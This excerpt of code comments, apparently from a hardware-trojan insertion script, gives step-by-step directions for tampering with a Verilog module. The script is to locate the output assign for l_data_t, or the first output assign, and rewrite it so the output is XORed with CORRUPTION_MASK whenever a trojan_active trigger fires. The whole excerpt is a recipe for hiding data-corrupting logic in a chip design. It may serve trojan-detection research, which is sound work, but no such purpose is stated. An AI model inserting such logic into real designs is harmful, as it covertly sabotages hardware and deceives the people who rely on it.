...
//
// IMPORTANT: l_data_t may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If l_data_t is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for l_data_t (or first output assign):
//     assign l_data_t = <expr>;
//   Replace with:
//     assign l_data_t = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
